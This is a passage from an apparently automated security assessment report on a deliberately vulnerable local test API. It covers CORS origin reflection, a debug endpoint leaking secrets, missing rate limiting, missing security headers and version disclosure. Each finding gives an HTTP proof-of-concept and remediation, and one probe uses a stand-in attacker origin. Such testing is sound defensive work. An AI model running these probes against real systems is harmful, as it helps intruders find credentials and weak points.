2. Avoid reflecting the client's Origin header blindly.
3. Implement an explicit whitelist of trusted frontend domains.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/documents HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Origin: https://evil-attacker.com

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 79
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "error": "Unauthorized",
  "message": "Missing Authorization Bearer token header"
}
```

---

### [VAPT-MISC-004] Unauthenticated Debug Configuration Endpoint Disclosed
- **Severity:** `HIGH` (CVSS 8.2)
- **OWASP:** API8:2023 - Security Misconfiguration
- **CWE:** CWE-215: Insertion of Sensitive Information Into Debugging Code
- **Endpoint:** `GET /api/v1/tools/debug/config`

**Description:**
An unauthenticated debug endpoint '/api/v1/tools/debug/config' is accessible in production, exposing secret keys, database file locations, and internal environment variables.

**Business Impact:**
Critical credential and configuration exposure allowing lateral movement and full compromise.

**Remediation:**
Disable all diagnostic, profiling, and debug endpoints in production deployments.

**Proof of Concept - HTTP Request:**
```http
GET /api/v1/tools/debug/config HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 989
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "app_secret": "app-super-secret-key-production",
  "database_path": "c:\\Users\\ASUS\\Desktop\\API Security Assessment & Automated VAPT Framework\\api_testbed\\vapt_testbed.db",
  "debug_status": "ENABLED",
  "environment_variables": {
    "HOMEPATH": "\\Users\\ASUS",
    "PATH": "C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\WINDOWS\\System32\\OpenSSH\\;C:\\Program Files\\Git\\cmd;C:\\Program Files\\nodejs\\;C:\\Program Files\\GitHub CLI\\;C:\\Users\\ASUS\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\ASUS\\AppData\\Roaming\\npm;C:\\Users\\ASUS\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Users\\ASUS\\AppData\\Local\\Python\\bin;C:\\Users\\ASUS\\AppData\\Local\\Programs\\Microsoft VS Code\\bin\\copilot-shim",
    "PATHEXT": ".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC",
    "PSMODULEPATH": "C:\\Program Files\\WindowsPowerShell\\Modules;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules"
  },
  "jwt_secret": "secret123"
}
```

---

### [VAPT-RATE-001] Missing Rate Limiting on Authentication Endpoint
- **Severity:** `MEDIUM` (CVSS 5.3)
- **OWASP:** API4:2023 - Unrestricted Resource Consumption
- **CWE:** CWE-307: Improper Restriction of Excessive Authentication Attempts
- **Endpoint:** `POST /api/v1/auth/login`

**Description:**
The authentication endpoint does not enforce rate limiting or lockout policies on repeated failed authentication requests. 10 rapid consecutive login requests were executed without triggering an HTTP 429 Too Many Requests or exponential backoff.

**Business Impact:**
Enables credential stuffing, brute-force password guessing attacks, and distributed denial of service (DDoS).

**Remediation:**
1. Enforce IP-based and user-account-based rate limiting on authentication routes (e.g. 5 attempts/minute).
2. Return HTTP 429 Too Many Requests with a 'Retry-After' header.
3. Implement CAPTCHA or progressive delays on repeated failures.

**Proof of Concept - HTTP Request:**
```http
POST /api/v1/auth/login HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive
Content-Length: 62
Content-Type: application/json

{"username": "rate_test_user", "password": "WrongPassword_9!"}
```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 401 UNAUTHORIZED
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 66
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "error": "Unauthorized",
  "message": "Invalid username or password"
}
```

---

### [VAPT-MISC-002] Missing Standard Defense-in-Depth HTTP Security Headers
- **Severity:** `LOW` (CVSS 3.7)
- **OWASP:** API8:2023 - Security Misconfiguration
- **CWE:** CWE-693: Protection Mechanism Failure
- **Endpoint:** `ALL Global Headers`

**Description:**
The server is missing standard protective security headers: X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, Strict-Transport-Security. These headers instruct modern web browsers and API consumers to enforce MIME sniffing protection, clickjacking defense, and HTTPS transport security.

**Business Impact:**
Increased susceptibility to MIME-type confusion attacks and clickjacking.

**Remediation:**
Configure API middleware or reverse proxy (Nginx/Cloudflare) to send:
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- Content-Security-Policy: default-src 'self'
- Strict-Transport-Security: max-age=31536000; includeSubDomains

**Proof of Concept - HTTP Request:**
```http
GET / HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 1119
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "endpoints": {
    "admin": [
      "/api/v1/admin/users",
      "/api/v1/admin/system/status",
      "/api/v1/admin/export-db"
    ],
    "auth": [
      "/api/v1/auth/login",
      "/api/v1/auth/register"
    ],
    "documents": [
      "/api/v1/documents",
      "/api/v1/documents/<id>"
    ],
    "orders": [
      "/api/v1/orders",
      "/api/v1/orders/<id>"
    ],
    "products": [
      "/api/v1/products",
      "/api/v1/products/search"
    ],
    "tools": [
      "/api/v1/tools/ping",
      "/api/v1/tools/debug/crash",
      "/api/v1/tools/debug/config"
    ],
    "users": [
      "/api/v1/users/<id>/profile"
    ]
  },
  "name": "ShopVault Enterprise REST API",
  "owasp_target_coverage": [
    "API1:2023 - Broken Object Level Authorization (BOLA/IDOR)",
    "API2:2023 - Broken Authentication (JWT none-alg & weak secret)",
    "API3:2023 - Broken Object Property Level Authorization (Mass Assignment & Excessive Data)",
    "API4:2023 - Unrestricted Resource Consumption (Rate Limiting)",
    "API5:2023 - Broken Function Level Authorization (BFLA Admin Access)",
    "API8:2023 - Security Misconfiguration (CORS, Missing Headers, Debug Exposure)",
    "CWE-89 - SQL Injection (Search endpoint)",
    "CWE-78 - OS Command Injection (Diagnostics Ping utility)"
  ],
  "security_mode": "VULNERABLE (Assessment Testbed)",
  "version": "v1.4.2"
}
```

---

### [VAPT-MISC-003] Server Technology & Version Fingerprint Disclosure
- **Severity:** `INFO` (CVSS 2.0)
- **OWASP:** API8:2023 - Security Misconfiguration
- **CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Endpoint:** `ALL Global Headers`

**Description:**
The server leaks detailed framework and version information via headers: Server='Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7', X-Powered-By='Flask-VAPT-API'. This helps attackers target known CVEs specific to the running version.

**Business Impact:**
Assists attackers during reconnaissance and vulnerability mapping.

**Remediation:**
Suppress or sanitize Server and X-Powered-By headers in production environments.

**Proof of Concept - HTTP Request:**
```http
GET / HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate, zstd
Accept: */*
Connection: keep-alive

```

**Proof of Concept - HTTP Response:**
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
Date: Mon, 02 Nov 2026 16:02:18 GMT
Content-Type: application/json
Content-Length: 1119
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: *
X-Powered-By: Flask-VAPT-API
Connection: close

{
  "endpoints": {
    "admin": [
      "/api/v1/admin/users",
      "/api/v1/admin/system/status",
      "/api/v1/admin/export-db"
    ],
    "auth": [
      "/api/v1/auth/login",
      "/api/v1/auth/register"
    ],
    "documents": [
      "/api/v1/documents",
      "/api/v1/documents/<id>"
    ],
    "orders": [
      "/api/v1/orders",
      "/api/v1/orders/<id>"
    ],
    "products": [
      "/api/v1/products",
      "/api/v1/products/search"
    ],
    "tools": [
      "/api/v1/tools/ping",
      "/api/v1/tools/debug/crash",
      "/api/v1/tools/debug/config"
    ],
    "users": [
      "/api/v1/users/<id>/profile"
    ]
  },
  "name": "ShopVault Enterprise REST API",
  "owasp_target_coverage": [
    "API1:2023 - Broken Object Level Authorization (BOLA/IDOR)",
    "API2:2023 - Broken Authentication (JWT none-alg & weak secret)",
    "API3:2023 - Broken Object Property Level Authorization (Mass Assignment & Excessive Data)",
    "API4:2023 - Unrestricted Resource Consumption (Rate Limiting)",
    "API5:2023 - Broken Function Level Authorization (BFLA Admin Access)",
    "API8:2023 - Security Misconfiguration (CORS, Missing Headers, Debug Exposure)",
    "CWE-89 - SQL Injection (Search endpoint)",
    "CWE-78 - OS Command Injection (Diagnostics Ping utility)"
  ],
  "security_mode": "VULNERABLE (Assessment Testbed)",
  "version": "v1.4.2"
}
```

---
